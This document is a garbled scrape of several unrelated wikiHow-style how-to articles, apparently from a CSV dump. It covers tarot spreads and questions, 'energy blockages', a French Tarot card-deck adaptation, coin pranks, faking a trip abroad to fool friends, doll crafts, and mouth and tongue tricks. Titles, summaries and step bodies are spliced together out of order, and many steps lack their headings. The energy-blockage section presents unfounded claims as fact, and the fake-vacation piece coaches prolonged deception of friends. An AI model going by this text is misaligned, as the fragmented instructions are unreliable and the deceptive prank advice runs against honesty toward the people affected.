, Place them back into the middle of the deck and put your cards away in a safe place.


You may want to keep a list or journal of your readings, to track how tarot has worked for you over time.

Remove conduit blockages.,
Focus on the present: Buddha has said, “""Do not dwell in the past, do not dream of the future, concentrate the mind on the present moment.” You can easily get swallowed up by your sorrows and your regrets, by things you wished you had done and by events which may have shaped you today.,
Be realistic: You may have very high hopes or expectations.,
Look inside yourself.",How to Get Rid of Conduit Energy Blockages," In order to get rid of conduit blockages, you must first recognize that your energy is blocked in the first place. Are you feeling out of whack? Does nothing seem to be going your way lately? Are you feeling especially emotional, depressed, or moody? Most likely, your positive energy is blocked.;
, You will be able to able to discover how to get rid of conduit blockages in a more focused manner if you first identify the source of your energy blockages. There are many potential causes for conduit energy blockages and it is not always easy pinpointing the exact source. Energy blockages can be caused by factors including stress, trauma, loss, disappointment, fear of the future, inability to let go of the past, and so forth. If you have trouble identifying the source of the energy blockages, you can still skip to step 3.

, Now that you have recognized that your energy is blocked and sought the root of the problem, you may attempt to solve it.

, However, just as the world constantly moves forward, so should you. Let the past remain in the past. Although you should move forward, take baby steps, not leaps. Focus on the future may lead to anxiety, stress, and fear. Remember, there is a difference between being pragmatic and planning for the future and obsessing over the future.

, However, a gap between these hopes and expectation and reality can lead to dissolution. If you would like to know how to get rid of conduit energy blockages, it is, therefore, crucial that you be realistic, that you accept reality as it is and not as you wish it to be.

If you are a novice reader, the Rider Waite deck is the most popular in the US and other decks often base themselves off it, so it's a good place to start. However, if there is a tarot deck that you are drawn to, then use that deck because it will channel your energy best to deliver the message.;
, This is not only important to your guest, but to you as well. You will need to establish mutual respect with your guest (the questioner), and gather thoughts on the symbolism of the Tarot. The atmosphere ideally should be quiet, peaceful, and without distractions.


It is important to get into the habit of creating the right mindset; however you do this, try to create a focus for your thoughts.

, Some Tarot card decks can be quite large and awkward to shuffle; it doesn't matter how they are shuffled if your guest can't shuffle in their hands.

, It is important that they are thinking about the question that they wish to ask while they do this.

, There are many different spreads which you can use, here are a few of the most common:



Three card spread. Lay out three cards. Left to right, each card represents the Past, Present and Future.
Five card Horseshoe spread. Lay out five cards in an upright arc. Left to right, each card represents the Present Position, the Present Desires, the Unexpected, the Immediate Future and the Outcome.


Celtic Cross. Lay out ten cards as shown in the diagram to the right. Each one of the numbered cards represent the Questioner's:

Present Position
Immediate Influences
Life
Root of the Reading
Past Influences
Future Influences
Feelings
Outside Influences
Hopes and Fears
Outcome



, Many Tarot practitioners have the questioner pick out and lay down the card, they do not touch the deck themselves.

, There are two sections within the Tarot deck, the Major Arcana and the Minor Arcana.



Major Arcana. . There are 22 of these cards. In some Tarot Decks, these are numbered, except the Fool. They represent different stages in life, different aspects of yourself, the situations you will encounter and the qualities you will need to help you.

Minor Arcana.There are 56 of these cards. They are divided into four suits with 14 cards in each, similar to normal playing cards. The suits are Cups, Wands, Pentacles and Swords, and each suit comprises of 10 numbered pip cards, and four court cards (Page, Knight, Queen and King).


The Cups Suit (also known as the Chalice Suit) is linked with the standard Hearts Suit, and henceforth with your feelings and emotions, especially love, kindness and admiration. It is also associated with the classical element of Water.

The Wands Suit (also known as the Staves Suit, Rods Suit or the Batons (the French word for Wands) Suit) is linked with the standard Clubs Suit, and with your intuition, especially vision, prediction and ""gut-feelings"". It is also associated with the classical element of Fire.

The Pentacles Suit (also known as the Coins Suit) is linked with the standard Diamonds suit, and henceforth with the material world; your possessions and the things you cherish. It is also associated with the classical element of Earth.

The Swords Suit is linked with the standard Spades Suit, and with your mind, especially your intellect and your decisions. It is also associated with the classical element of Air.

Notice your reaction to cards.,
Remember things you might want more direction on.",How to Ask a Tarot Question," Questions that start with how, what, where or why are open-ended, so they allow for deeper answers to some of life’s most trying concerns. Start questions with how, what, where or why for tarot answers that help you explore what you can do to change a situation. Open-ended questions include:


""How can I free myself from financial struggles?""
""What areas do I need to work on to bring more love into my life?""
""Where are there opportunities to help further my career?"";
, ""Should"" questions rarely allow tarot cards to help you, because they take away your power to make your own decisions. Similarly, ""when"" and ""will"" questions do the same. Avoid will, when or should questions and don’t expect the cards to tell you answers to them, because life is not that straightforward.


Remember the reason you’re asking help from tarot cards is because there’s no easy solution to your question or concern.

, Sometimes you may not have a question about a specific concern. That’s okay. Ask a question about your general life direction like, “Where am I headed on my current path?” or “What energies are surrounding my life right now?” Tarot cards are meant to give insight into your life and general questions can accomplish this., The best tarot questions are phrased in a way to help you get guidance or direction on a concern. Don't expect the cards to tell you what to do in order to take responsibility off yourself. Consider the following examples:


Don't ask ""Should I travel through Europe for three months?"" This question shifts responsibility for a life decision off yourself and onto the cards.
Ask ""How will it affect my loved ones if I decide to travel through Europe for three months?"" This question allows the cards to give you guidance without shifting responsibility., If there are people involved in the situation or concern you have, consider how everyone is affected--both directly and indirectly. Though tarot questions should be about yourself, be considerate of how your decisions affect others.


Let's say you're thinking about a career change. Ask yourself how a change in employment might affect people like a roommate or family members.
Don't forget about your pets! If you're trying to decide on travel plans, be mindful about how they'll handle your absence., You may need help making an important decision and asking more about potential benefits and drawbacks can help. Just like a list you might make to help with important decisions, look for questions about pros and cons.


Maybe you’re struggling to know whether you should send an aging parent to an assisted living home or not. Ask “What are the benefits of leaving my Mother at home?” or “What are the drawbacks to leaving my Mother at home?”
Maybe you want to know whether a difficult relationship should end. Ask ""What am I getting out of staying in this relationship?"" or ""How is this relationship hurting me?""

, We all have areas we’d like to improve on and if you’re honest, you should come up with at least one or two. Look for ways you can improve yourself and the people around you.Concerning your body image, ask “How can I feel better about how I look?” or “What can I do to get in better shape?”
Concerning your family life, ask ""How can I spend more time with my loved ones?"" or ""What can I do to feel closer to my siblings?""

, You may be dealing with what seems like a large problem, but it can always be broken down. Though general questions are great if you don't have a concrete concern, breaking larger issues down can help you get to the root cause. For example:


Instead of asking “How can I free myself from money struggles?”, ask “Where can additional income come from?” or “How can I save more on a daily basis?”
Instead of asking ""How can I make my relationship better?"", ask ""Why does my spouse get upset with me, when I do x,y, or z?""

, It’s easy to get trapped into negative thinking when something isn’t going as planned. Even if you have concerns as to why things are happening or not happening, keep the question positive. Frame questions so that they're free of negative connotations.


Ask “What can I do to be a better public speaker?” instead of “Why can’t I overcome my fear of public speaking?”
Ask ""How can I be more sociable?"" instead of ""Why can't I make more friends?""

, Whether you’re going to a professional card reader or exploring a deck of tarot cards on your own, inquire about what you don’t understand. You may draw what looks like a negative card and need more direction. Explore what confusing cards might mean.


You may draw the hanged man when you want to know how you can help a situation. On the surface, this looks like powerlessness, but it can be about acceptance.
You could draw the hermit when you ask about how you can bring more excitement into your love life. Instead of saying you’re destined to be alone, it could be saying you need to reflect inwards before you can find a fulfilling love life., The way you respond to cards as they’re laid can give you valuable insight into how you’re dealing with certain situations. Pay attention to your reaction to different cards. Don’t overthink it and write down how you feel about them., A tarot card reading is no different than a lecture you might have additional questions about afterwards. As you go through a spread of cards, remember the points you could use more direction on.


If a card indicates you need to embrace your feminine side, remember that and ask “How can I better embrace my femininity?”
If a card says your expectations are too high, like the four of cups, remember that and ask ""How can I be more realistic?"""

,, For that it is mandatory to do a rule of three. For instance, if you know that a Tarot deck has 78 cards and 91 points do simply as follows:


If for 91 ---- 78 // for x ---- 40. Now you only have to multiply the first number of the first formula by the second of the second formula and then divide it between the second one of the first formula. That is (91*40)/78=46'6. You can round it up or down.

, For example, with three Oudlers you need 36 points. How many points would you need in a card deck of 40 latin deck?


If for 36 are 78 how many are (x) for 40 cards? 36 ---- 78 // x ---- 40. Repeating the formula of step three, we have that (36*40)/78=18'4. Hence, if you have three Oudlers' in a card deck of 40 cards, you need to have 18'5 or rounded.

, For the Poignée it may be that you want to adapt another method because they are more in the original card deck of Tarot so it does not make so much sense to announce Poignée with three cards so you can choose to announce it with the half of your cards being Atouts. Give fixed points, because this ones are not multiplied by the contract and you are done.


You can also choose to announce simple, double or triple with 1/3, 2/3 or 3/3 of Atouts in your hand. Get the imagination flying.

,

Knowing previously that in a card deck of 40 cards there are 46'6 total points and having adapted the quantity of points per Oudlers now you only have to give points to the cards to make all fit altogether. For instance, the Kings can do 3 points each one, the Knights 2, the Jacks 1 and the others 0'5 —including the non Oudlers Atouts (all except the King, 7 and 1 o spades or bastos)— in the case it will be the latin deck. If they do not fit because you have more points you can modify the points of the cards until you get them fixing and leave it like that, and get the points a little above 46. Remember that it is only to have fun and you do not need to break your brains thinking.,

As you know if you know how to play French Tarot the Atouts suit is as in spades —trumps—, i.e. , that is a suit that can win to any other suit unless it is a superior Atout. Hence, you need to get one of the suit of the card deck acting as Atouts. With 40 cards you will be taking the bastos suit —spades— as Atouts, being that the one of bastos or As —Ace—, if it is english deck, it is the Petit, the 12 of bastos or spades' King it is the equivalent to the 21 and the 7 of the same suit the Excuse.,, For instance, if it is a standard English deck and you get two it will be enough to adapt it. In total you will have 55*2=110. 52 normal cards and 3 jokers for each card deck. If you adapt a latin card deck you will need:


To buy four without 8, 9 and 10.
To buy two with 8, 9, and 10.







,


English standard deck.

Use four of the jokers of the deck to simulate the Cavaliers (Knight), now you will have Roi (K), Dame (Q), Cavalier (Joker), Valet (J). Do it for example writing a big C done with a permanent maker or in a corner of the card if you do not want to ruin your card. You can mark the card simply with the suit, assuming you will know that the Joker represents the Knight. Try to avoid pressure on the card when writing, you will guess which card it is if you apply a lot of pressure on it.






Use another of the Jokers to represent the Excuse writing on the card a big E in a similar way as you have done with the Cavaliers. You can leave the Joker unwritten because you will know that the one without letter will be the Excuse.






Set aside an entire deck with Roi (King), Dame (Queen), Cavalier (Joker), and Valet (Jack) and 10, 9, 8, 7, 6, 5, 4, 3, 2, 1. One for each suit of the card deck.






Use the 21 cards of the rest of the cards to have the Atouts writing similarly numbers from 1 to 21 without applying a lot of pressure on it to do not know wich card it is.








Latin deck.

Use cards from another card deck to simulate, writing on it, the Dames, 8, 9 and 10 —not the Sota —Knaven (10 in latin deck)— that will be used as the Valet— if it is the case that you do not have them.
Use the 21 cards of the rest of the cards to have the Atouts and the Excuse.



,


14*4 —one for each suit— = 56
Plus 21 Atouts. 56 + 21 = 77.
Plus 1 Excuse. 77 + 1 = 78.

Watch your prank take effect.",How to Play the Coin Prank1," You can set this trick up in any location and it is sure to fool someone. For the best effect, scout an area that is heavily trafficked. An example of somewhere with heavy foot traffic is a street festival or a busy corner. The coin will settle best on smooth cement, so keep this in mind when scouting for a location.


You should also consider an area where you can stand where no one will notice you.;
, Find a penny or another suitable coin like a quarter, dime, or half dollar. Try to use a coin that is worth more, so more people will be more inclined to pick it up. If you can find a gold colored coin, all the better.


Gold colors tend to glint temptingly in the sunshine.

, Pick out a decent glue that will hold. The best type of glue to use for this trick is some type of super glue. Super glue dries quickly and will be nearly impossible to remove. Super glue also comes in a smaller container so it will be harder for bystanders to notice what you are doing.


Attach the glue to the coin itself and then place it on the ground., Once the coin and glue are set onto the desired spot, step on the coin with your shoe. By stepping on it, you are helping the glue settle faster. This is also a good way to be discreet while setting up a prank.


Be sure the adhesive side is facing the ground.
Stand on the coin for about 30 seconds to a full minute. Check your phone and act like you are preoccupied.
Test the coin yourself by feeling if the glue is fully settled.

, Go to a discreet location where you can see the coin, and camp out for a bit. Watch for people who become enticed by the coin on the street. If you catch one of your friends going for the coin, take a picture so you can show him. It is all in good fun, and no one should get too upset by this."

The larger the value of the coin, the more people will be inclined to pick it up. You’ll also need a long fishing wire. Fishing wire is good for this prank because it is difficult to see.


You can also use a fake coin, as long as it resembles a real coin.
You should use about three to five feet of fishing wire. The key is to find a close enough place to hide while performing the trick. You could also use a longer strand, but you shouldn't use more than ten feet of fishing wire.

, Use a dab of superglue to attach one end of the fishing wire to the coin. You could also tie the fishing wire onto the coin, but this might come loose easily. Test each method before taking it out into public.

, Go to a public setting like a park or somewhere you’ll be able to hide easily. Plant the coin in the middle of a walkway while nobody is around. Go hide somewhere unassuming, but in a place you can easily see the coin.


Make sure you have a grip of the fishing wire and its slack so you can easily pull the string to trick someone.

, Wait until a curious stranger comes to pick up your prepared coin. Once they bend over and start to reach for the coin, give the wire a tug. If they begin to chase after the coin, tug the coin again. Keep the prank going for as long as they fall for it.


You can reveal yourself if they haven’t discovered you yet."

Give them three attempts to try it. They will feel determined to get the coin to roll down their face and be left with several marks on their face., Don’t be cruel and let them walk around for the rest of the day with pencil on their face. Tell them they’ve been fooled and to look in a mirror. Once they realize they’ve been tricked, give them the coin. It is a nice gesture you can offer for their cooperation."

Big, prominent cities are common choices for tourism, so your friends won’t think much of it when you tell them you decided to go. Furthermore, big cities often contain multiple subsections and a people of various ethnic backgrounds, so you have lots of leeway in telling your friends what you’re going to do there
Small, lesser known cities may confuse your friends a little, but you can make up almost anything about them; your friends will never find out.
Make sure you don’t choose a location that your friends are familiar with—say, Vancouver if you have Canadian friends. Your friends will notice something fishy, and you will almost certainly be called out on it.;
, Obviously, your friends will be curious about where you are going, so you must make sure you know what to tell them. Make sure you find out prominent landmarks, local customs, popular foods, and perhaps a bit about their history. There are plenty of online travel guides that you can base destinations on, too.

, By the time your “vacation” day arrives, your friends will all know about it.

, Begin with some uncertainty, as if you were still planning your vacation, but after a few days start telling them you will be going for sure.

, Talk about your trip frequently. Make sure to tell them everything you are going to do there from your previous research. Bring it up casually in random conversations, and keep sharing it until your friends become jaded.

, When your “travel” date finally arrives, make sure you give a huge farewell to make sure all your friends know you are going abroad.

, You need to make sure your friends remember you’re abroad, so keep in touch with them the whole time.

, Since you are abroad, you will likely be doing a lot of travelling and therefore would be taking most of your videos on your smartphone. Download videos of your destination from youtube.com using sites such as Converter. Google some images and crop them so it seems as if they were taken from a phone.

, It is likely that if you’re travelling abroad, there will be a difference between your and their time zones. To really convince, do much of your online activity when you would be awake wherever you traveled, even if it means waking up in the dead of night.

, You’re on a trip, so you obviously don’t have time to hang out with them. Tell your friends you’re too busy to meet, and definitely stop doing some of your favorite things together.

, Your friends will be extremely excited that you just went on a vacation, so they will be constantly be badgering you with questions. All eyes will be on you, so make sure you don’t let anything slip. Act as though you are suffering from jet lag, and keep referencing to your trip for a few days. If you can’t hold up under the pressure, try to avoid your friends altogether.

, Since you just traveled abroad, your friends obviously expect you to come back with actual pictures and souvenirs. You don’t have any of these, so you need to make excuses for why you can’t show them. A few ideas are to keep them from visiting or say that you are too lazy to dig them out.

, Okay, joke's over. Time get some friends that aren't imaginary.

Prop yourself up.",How to Walk on Your Kneecaps," You should be sitting on the floor with your legs straight and flat. Make sure there is something to grab in case you start to fall on your sides, and that there's nothing in your way. You don't need things on your side to grasp unless you are not experienced in doing this. You will need to build up your balance before you can walk without support.;
, If you're not flexible, this is when you may start to ""feel the burn"". It might hurt a little, but this is just because you are stretching your leg in a way that isn't too commonly done. If it hurts too much, take a break and try again later.

, Your left leg should be resting over your right. This part is where it will probably be a smidge uncomfortable. If you don't think you can go on, don't.

, Now you'll need something for support as you pick yourself up. Put both of your hands firmly behind you, and make sure that you're steady. If you don't have good balance, you probably won't be able to do this and will fall over. This is okay, just wait a while and try again. If you want, you can also put your hands in front of you. Some people prefer this.

, This is one of the hardest parts. You'll most likely fall over, whether you're good at balancing or not. Most people do on the first try, but then they get it on the third or fourth try. Once you're standing on your kneecaps, just lift one kneecap up at a time, and gently move it forward a few inches. You should be able to take at least two steps before falling and getting back up.

Find some old Barbie dolls, or any other doll.,
You may want to dye your doll's hair.,
You can also cut the doll's hair.,
Get some good accessories.",How to Make a Gothic Doll," A baby doll would make a funky, goth doll, or use a teenager doll like Sindy or Jem. Buy a new doll if you wish. Many people think that using an old doll works best, then you can alter just about anything and won't have to worry about wasting money. Any doll can be Gothic if you are creative enough.


Check garage sales, second hand stores, and dollar discount stores to find dolls and clothing for them.
Also try shopping around online for a specific doll.;
, You can have it be anything! Black, purple, red, green, pink, blue... even blonde. But you can always keep their ""natural"" hair color too. It's alright to have it ""naturally"" brown or highlighted.


If you want to dye your doll's hair, cover a table with newspaper. Take some masking tape or Vaseline and put it on the doll's upper torso, neck, face and back of head to prevent from staining the doll's skin.
Get some dye. Powdered hair dye in boiling water works the best. Use half the package and stir it in the water until it is dissolved. You can also try things like fabric paint or regular old drugstore hair dye.
Dye the doll's hair! Dip his/her hair into the dye and let it sit for at lest twenty minutes, a half hour at the most. Rinse the doll's hair well under warm water. Soak up any excess moisture with a paper towel. Set the doll in a warm or sun location for a few hours.

, Look up some hairstyles you like online and snip away! You can give it bangs, razor it, layer it, or just cut it with your eyes closed. This step is optional, however.


If you want to style the hair, go ahead! Put it in pigtails, ponytail, curl it, crimp it, dread it... anything you can imagine doing to a doll's hair.
A few extra crafty ideas are dread falls and hair extensions. You can look around for clip in hair extensions, cut them to the doll's length of hair, and pop them in! You can make dread falls out of yarn or PVC pipe. Plus, many other materials, too. Read the related articles on hair falls and dread falls for more pointers.

,


Hair accessories are nice and can totally be personalized. Buy small bows and hair ties if you can find them. Little flowers and ribbons look nice too. Dig around in your doll's accessories and clothing for some materials to make accessories out of.
Makeup! If you want eyeliner, use a permanent marker with a fine tip to line their eyes. Eyeshadow can work, but rubs off easily. Try a thick tip sharpie for eyeshadow. These can be any color you want. If you want lipstick, again... the sharpie. A few materials for white foundation are costume makeup, read foundation, white lip gloss, white out, or acrylic paint.
Piercings and tattoos are a personal choice. If you think it's a little overused, feel free to skip this step. Pins are the best way to go for facial piercings. Simply just push a pin into her head where you want it, and voila! You can pierce her eyebrow, nose, lip, cheek and chin. Also go for ears, navel, and body piercings. As for tattoos, draw your own on with a sharpie, or if you aren't the artsy type, then use temporary stick on tattoos.
Paint her nails with a fine tip sharpie.
Now for the tops. You can probable just take any old Barbie top and build from there. Use any lace, fishnet, pins, safety pins, fabric paint, beads, string, yarn, PVC pipe, cloth, leather, old shirts, fur, and anything else you can find. Personalize it and make it her own!
As far as pants go, basically the same for the tops. Take any old skirt or pair of pants. Cut a slit through the skirt and have some fabric poking out. or maybe sew a little lace on the ends. Or maybe a few buttons or rips on them.
You're probably going to want accessories, am I right? Fishnets, lace and stockings are your best friends as far as the hosiery goes. You can make gloves and stockings out of those for your doll. Make her some jewelry! Cut a chain and get a charm on it. Make her a choker out of a cat collar. Use your imagination and be creative!
As far as shoes go, you can find a pair of boots or combat boots online. If not, personalize a pair of her shoes/boots with chains or lace.

Remember that although it might be frustrating, repetition is key.",How to Wiggle Your Small Toe Separately from the Rest of Your Toes,";
, Watch out for straining your torso muscles too much. Sometimes holding your foot with the opposite hand is more comfortable than the parallel hold.

, Do you feel the resistance? This resistance is what you want to get rid of.

, You can do this with your eyes closed to avoid getting distracted by the visual feedback (which might prove deceiving).

,, It takes dedication and devotion to gain control of these muscles but once you do it's as easy as wiggling your big toe.

Be confident.,
Make sure you do not have a dark photo, which means have good lighting.,
Do not have frizzy hair or messy hair.,
Make a good impression with all your judges so they will like to know you and how well you model.

,
You can wear any makeup, jewelry and clothes but make sure they are high-fashion.,
For editing your photos, I usually don't.,
Plan out your photo so it will look better.

,
Add details like another model or some decorations.

,
Do your best on camera angles and take more than one photo.,
Have fun.",How to Win a BNTM (Bratz Next Top Model)," If you aren't confident then you will not make as good photos.


When you send your photos you usually do it by email, because that's what judges prefer, but you can also send them off Flickr, too. TIP: Make sure you send your photos in on time or there is a big chance you will be eliminated and send the photo in before the due date so the judge has time to prepare the video.;
, You want to make sure you can easily see the doll and not have the background overpower the model.


The judges want creativity in each photo so that means you should make a dress or draw a background. Also, take risks. Add a theme to your theme. For example, if the theme was colors and you got the color blue, maybe you can be a BLUE mermaid in a BLUE ocean, or pool.

, Most judges will notice the crazy hair. Make sure no hair is in your face unless if its supposed to be like that like a crazy monster but no matter what, you always have to be able to see your dolls eyes and most of her face like nose and mouth, besides those things, you can cover any other part of the models face.

,, You cannot put too much makeup or you will look funny, mad or just simply different. Jewelry has to mach with the outfit mostly white, black, silver or gold jewelry will work with any outfits you choose. Clothes have to match your theme like if your theme was animals and you got a parrot do not wear a blue dress. Either make a feathery dress or tape feathers onto your doll.

, If you do, don't do too much or the photo will look stupid. Maybe just do editing on makeup, words and lighting. That's all the editing you should do. A great editing program is Movie Maker Magic.


Some rules in BNTM's are do not change your doll. So if you lose your doll tell the judge and replace it with a similar or the same doll. Another rule is be committed.

,,, Take two photos of each camera angle like 2 from up view, 2 from down view, 2 from left view, 2 from middle shot and 2 from right view. That's so you make sure you know which angles make the picture look best and if one turns out blurry. Then you choose your two favorites and send both to your judge and let your judge choose your favorite photo. That gives you a better chance of top photo.

, If you don't have fun, then why did you sign up? To win? There is no reason to sign up to win. You sign up for just the fun and experience of it. Also make sure you become friends with your opponents.

If you want to make it more realistic, you can sit next to your doll and give yourself a real facial with real cucumbers at the same time.

, Maybe even twice. Don't forget the undercoat (especially if you have Clawdeen, as she's a werewolf).

, For example, Cleo and Clawdeen would barely be in the same social group, while Frankie and Clawdeen would easily be in the same group.

, And a bed for the pet, too. If you have Frankie Stein, give her a pet that is a mishmash of animals - maybe even a meowing dog or a barking cat.

, You could make a house from:


A Barbie dream house
Boxes stacked up, or made out of wood
Turn an empty bookshelf into a house.

, For example, wallpaper the house and rooms, depending on which doll lives there. You can also buy or make furniture for the house., Don't forget bathrooms, water fountains, library, computer lab, gym, dinner hall, dance room and lockers. Oh, and don't forget the bell.

Emphasize “ing” when saying a word that starts with a problematic letter.,
Avoid words that end with “able.” Because of the complex sound and the inclusion of the problematic “b,” you should avoid using words that end in “able.” Instead, substitute different words for words that end with “able.”


Instead of saying “agreeable,” say “compliant.”
Instead of saying “adorable,” say “darling.”
Instead of saying “comfortable,” say “contented.”,
Speak entire sentences.,
Write a monologue and practice it.,
Talk to your friends.,
Record yourself.",How to Talk with Your Mouth Closed," To speak with your mouth closed, you’ll need to make sure your lips are parted ever so slightly. Without parting your lips just a little bit, you won’t be able to get any sound out of your mouth.Practice parting your lips in the mirror. You should be able to breathe normally and see your teeth ever so slightly.;
, After parting your lips, you’ll need to make sure your top and bottom front teeth are lightly touching each other. If your teeth aren’t touching, people will be able to see your tongue moving as you talk.Don’t grind your teeth against each other. Instead, let them sit together comfortably. Your jaw should be relatively relaxed.

, Once you have your lips and teeth in place, you should try to move your tongue around. If your tongue can’t move enough, you won’t be able to make the sounds you need to make.If your tongue can’t move, you may need to relax your jaw a little bit and part your teeth a little bit.

, After you’ve positioned your mouth, you need to look at yourself in the mirror. Your lips should be parted a little. You may be able to see your teeth. However, you should not be able to see your tongue.If you can see your tongue, or see it moving around, you’ll need to position your teeth so they hide your tongue., Inhale through your nose and exhale through your mouth. Make sure to stay calm. Avoid hyperventilating or breathing too deeply. If you breathe too deeply, you won’t be able to keep your mouth closed.

, Say easy letters repeatedly until you can say them comfortably. Ultimately, the only way to speak with your mouth closed is to practice making as many different sounds as possible. Easy letters include:


A, C, D, E, G, H, I, J, K, L, N, O, Q, R, S, T, U, X and Z., There are seven letters (B, F, M, P, V, W and Y) that are tricky to say with your mouth closed. This is because they require you to move your lips to make the sounds associated with them. To make the sounds of these letters, you’ll have to substitute them for easier letters or sounds. Substitute:


D for B
”Eth” for F
N for M
T for P
”THEE” for V
O for I
W and Y, After you’ve mastered your letters, try practicing full words. Feel free to start off with easy words like “mom” and move on to tougher words like “butterfly.” Without practicing a variety of words, you won’t be able to master talking with your mouth shut.Make a list of easy and difficult words and repeat them 10 to 20 times each – or until you feel comfortable saying them. Then, move on to new words.

, Since “ing” is such a powerful sound, you can use it to obscure your substitution of a difficult letter. Simply emphasize the “ing” and possibly say it louder.


Since “f” is difficult to say, with “fishing,” say “th-ish-ing.” Say the “ing” loud.,, Start to put individual words together to form sentences. Make sure to include a few somewhat difficult words. Without these, you won’t be able to master the art of talking with your mouth closed. After enough practice, you’ll find that your pronunciation will get better and better.


Start with a simple sentence like “Hi, my name is John and I am from Nebraska.”
Move on to tougher sentences like “I believe that running is one of the most effective ways to exercise.”, After you’ve mastered the alphabet and words, you should write a monologue and practice it. Start by using words that you’re most comfortable with. However, make sure to incorporate some words that you think are challenging.


Consider giving a speech with your mouth closed. For example, work on Abraham Lincoln’s “Gettysburg Address.”

, While practicing by yourself is certainly helpful, you should try talking to your friends with your mouth closed. This way, you can not only entertain them but be challenged by unscripted conversations you’re likely to have with them.


Try to hold a normal conversation with your friends. Talk about various subjects and let them ask you questions.
Invite friends and family to watch you talk with your mouth closed.
Get a ventriloquist dummy or puppet and hone the art of ventriloquism.

, One of the best ways to improve your ability to talk with your mouth closed is to record yourself. By recording yourself, you’ll be able to hear exactly how you pronounce certain words. Then, you can practice problematic words until you say them better.Use your cellphone or a tape recorder to record yourself.

Wet your lips.,
Whistle.,
Hold your breath.,
Practice mouthing the word ""hoink."",
Tap or flick your cheek during the mouth movement.,
Learn the mouth shape even if you can't whistle.,
Relax if your muscles are sore.,
Prevent yourself from exhaling.,
Wait for the flow of air during the hoink motion.",How to Make a Water Drop Sound With Your Mouth," Drink a glass or two of water if your lips are dry, and whenever you need to while practicing. Apply lip balm and try again later if they're severely chapped., Whistling involves the same mouth shape, and may be easier to learn.If you can't whistle, pucker your lips slightly with a gap between them for air to pass through. Pull your tongue back.


Pull your lower jaw downward to stretch out your cheeks and give yourself more air to work with.

, You can't make the water drop sound while blowing or breathing through your nose.Get in the habit of breathing through your nose while practicing.

, Practice this for at least five or ten minutes. Say the word ""hoink"" repeatedly, then repeat that same mouth motion without vocalizing or grunting.Move your jaw and Adam's apple quickly upward as you do this, and move your tongue up and forward.


You should feel a short flow of air leave your mouth while you say this, even though you aren't exhaling.
If you know Russian, a certain vulgar three-letter word beginning with Х works even better.

, Repeat the ""hoink"" mouth movement. Right before you finish the tongue movement, tap the outside of your cheek with your finger. Flicking your cheek will work instead, and may help get a louder sound when you're first practicing, but you're striking too hard if you give yourself a red, stinging cheek.Some people find it easier to tap with the eraser end of a pencil, instead of a finger.
This step often takes 45 minutes of dedicated practice, and can take days if you practice only occasionally.
You can also try tapping the hollow between your teeth, the back of your lower jaw, the side of your front eyetooth, and anywhere in between.

, This trick is much easier to learn if you can whistle, but that doesn't mean you can't do it. To make the right mouth shape, purse your lips together by drawing in the corners of your mouth slightly. Don't overdo it and make a ""duck face."" Your lips should only stick out slightly, with a gap in between them for air to pass through.

, If your jaw or cheeks are getting tense, you've lowered your jaw too far. If your cheek is red and stinging, you're flicking it too hard. No part of this process should feel painful or uncomfortable.


If you're sore simply from practicing for a long stretch of time, take a ten minute break.

, If you keep forgetting not to blow during your practice, inhale through your nose, and the passageway at the back of your mouth should automatically close shut.

, If you can't get the sound within five minutes of flicking, stop and focus just on the hoink motion. Pay attention to the air flowing past your lips. If you don't feel it, try moving your tongue or jaw and trying again. Once you notice a brief flow of air, as though you were blowing gently, start flicking again and try to flick at the same time as that flow.


If you're lucky, you might even here a hollow whistling sound or even a faint water drop noise without the flick – then you're definitely on the right track.

Wash your hands.,
Gather a clean towel or some paper towel.,
Roll your tongue into a tube shape.,
Exercise your range of motion with your tongue rolled.,
Evaluate each side of your mouth.,
Twist your tongue onto its side.,
Use your teeth to guide your tongue.,
Hold your upside down roll.",How to Roll Your Tongue (Upside Down)," During the course of your preparation for rolling your tongue upside down, you will probably have to touch your tongue at some point or guide it into the desired shape. Wash your hands before touching your tongue to prevent the spread of germs and bacteria., It is common while practicing this kind of trick to drool on yourself or your fingers. If your fingers are too slippery, it may make it difficult for you to guide your tongue into the shape you want. Have a towel or paper towel on hand so you can wipe your hands or face.

, To accomplish this, you will have to roll the opposite sides of your tongue to the inside until each meet. Now your tongue should make a tube shape in your mouth. Extend your tongue out from between your lips while doing this and hold the rolled position.


If you have difficulty rolling the opposing sides of your tongue into the tube shape, use your fingers to guide the shape of your tongue. Push the edges up and round your lips so as to support your finger shaped tongue. Practice this motion regularly for several seconds at a time to build mouth/tongue flexibility.
You can also gently push the middle of your tongue downward with your finger or a tongue depressor, allowing the sides of your tongue to curl along your finger or depressor. Shape your mouth in an ""O"" and extend your tongue out of your mouth while holding this position. Practice this motion regularly for several seconds at a time to build mouth/tongue flexibility.

You might also use a clean writing or eating utensil to guide your tongue into the rolled shape.


As rolling your tongue becomes easier, you should remove your guides (fingers, tongue depressor, etc.). Your goal should be to roll your tongue and peek it outside of your mouth fully rolled.

, Now that you have trained your tongue muscles to roll in a tube shape without the support of an object or your fingers, you will need to exercise your tongue's range of motion. Rolling your tongue upside down will require you to move your tongue in a way that may feel unnatural; only practice can make this easier.


Reach your rolled tongue as far to the left and right as you can. Pushing the limits to your tongue's range of motion will further extend those limits.Open your mouth wide and move your tongue up and down while rolled. Once this becomes more comfortable, try to move your rolled tongue in a diagonal pattern from upper right to lower left and vice versa.
Try to change the orientation of your tongue. This will likely be the most difficult of your tongue exercises. The normal tongue roll is vertical so that the opposing edges of your tongue meet above the middle of it. Twist your tongue to the left and the right while holding your tongue roll.

Your goal with this exercise is to turn your tongue horizontally, so that the opposing edges of your tongue meet toward a corner of your mouth. Even if one side is easier than the other, exercise both sides until twisting your tongue roll becomes easier.



, At this point, you may have noticed that your tongue moves/twists more easily on one side of your mouth than the other. This is most likely your dominant side, and it will be easier for your to turn your tongue upside down on this side.

, Chances are this action will feel foreign to you at first, but with practice it will become more natural. You may need to exercise your tongue's flexibility before you are able to orient your tongue so that the opposite edges meet horizontally toward the corner of your mouth.


When you have successfully mastered this, your taste buds (the top of your tongue) will be pointed toward the corner of the mouth on the side of your mouth which you feel most comfortable.

, Using your upper teeth, gently begin twisting your tongue farther toward the bottom of your mouth. Try to hold this position for several seconds before releasing.


As you become more comfortable twisting your tongue in this fashion, start attempting to make the motion without using your teeth. In this way, you will train the muscles of your tongue in a new range of motion.
When you can roll your tongue and twist it so that your taste buds are oriented mostly toward the bottom of your mouth, you have successfully rolled your tongue upside down, though you may only be able to hold this position for a few seconds at first. More practice will give you more control.

, Without using your fingers or teeth, roll your tongue and twist it in the direction most comfortable to you. If you can control this position, holding it for several seconds, you have successfully trained the muscles of your tongue to perform the upside down tongue roll.

